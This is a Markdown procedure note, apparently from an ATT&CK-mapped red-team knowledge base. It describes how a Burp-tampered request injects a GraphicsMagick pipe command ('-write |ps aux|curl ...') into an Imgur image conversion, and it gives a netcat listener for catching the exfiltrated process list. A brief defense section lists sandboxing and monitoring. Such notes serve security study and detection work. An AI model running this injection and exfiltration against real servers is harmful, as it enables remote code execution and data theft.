---
id: p6f7g8h9-i0j1-2345-fghi-6789012345
tags:
  - rce-execution
  - data-exfiltration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/ps-aux-exfil]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:14.497Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Execute-Injected-Command-for-RCE

## Summary

This procedure forwards the tampered request to execute the injected command, achieving RCE on the Imgur server and exfiltrating process information.

## Description

Upon processing, the server runs 'gm convert ... y=0 -write |ps aux|curl ...', where GraphicsMagick interprets the pipe as a command filename, executing the shell pipeline to list processes and send output via curl to the attacker.

## Requirements

1. Payload-injected request ready in Burp
2. Listener on attacker server (e.g., port 80)

## Defense

Defensive measures and detection strategies:

- Run image processing in sandboxed environments
- Monitor for outbound curl or unexpected network connections from image processors
- Audit GraphicsMagick invocations in logs

## Objectives

1. Trigger server-side execution
2. Receive exfiltrated data
3. Confirm RCE

## Instructions

### Step 1: Forward Request

**Context**: Send the modified request to the server.

**Command** (Burp action):

Click 'Forward' in Burp Proxy or use Repeater to send.

> Server responds. Expected output: HTTP 200 or image response.

### Step 2: Capture Exfiltration

**Context**: Receive data on attacker server from injected [[commands/ps-aux-exfil]].

**Command** (Server side, e.g., nc):

nc -lvp 80

> POST body contains ps aux output. Expected output: Process list dumped to listener.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/ps-aux-exfil]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- command-execution
- exfil-curl
